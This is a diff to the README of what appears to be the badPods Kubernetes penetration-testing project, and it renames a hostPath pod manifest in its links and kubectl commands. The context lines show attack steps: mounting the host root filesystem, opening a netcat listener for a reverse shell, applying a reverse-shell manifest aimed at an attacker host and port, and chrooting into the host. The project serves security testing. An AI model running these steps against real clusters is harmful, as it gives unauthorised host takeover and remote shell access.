@@ -27,16 +27,16 @@ spec:
     hostPath:
       path: /
 ```
-[pod-hostpath.yaml](pod-hostpath.yaml)
+[hostpath-exec.yaml](hostpath-exec.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostpath.yaml  
+kubectl apply -f hostpath-exec.yaml  
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpath/pod-hostpath.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpath/hostpath-exec.yaml  
 ```
 
 #### Exec into pod 
@@ -68,7 +68,7 @@ spec:
     hostPath:
       path: /
 ```
-[pod-hostpath.yaml-revshell.yaml](pod-hostpath.yaml-revshell.yaml)
+[hostpath-exec.yaml-revshell.yaml](hostpath-exec.yaml-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -78,7 +78,7 @@ nc -nvlp 3116
 #### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostpath/pod-hostpath.yaml-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostpath/hostpath-exec.yaml-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
